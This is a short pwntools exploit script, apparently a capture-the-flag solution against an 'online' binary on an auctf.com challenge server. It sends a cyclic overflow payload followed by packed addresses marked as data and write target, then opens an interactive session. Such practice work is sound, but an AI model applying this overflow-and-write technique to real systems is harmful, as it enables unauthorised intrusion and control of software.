from pwn import *
import sys

elf = ELF("./online")
elf.address = 0x56555000
p = remote('challenges.auctf.com',30013)

p.sendline('Teddy\nattend Hacker')

payload = b''
payload += cyclic(0x800)
payload += p32(0x56556299)  # DATA TO WRITE
payload += p32(0x56559048) # WRITE TO THIS
p.sendline(payload)

p.sendline("study Algebra")

p.interactive()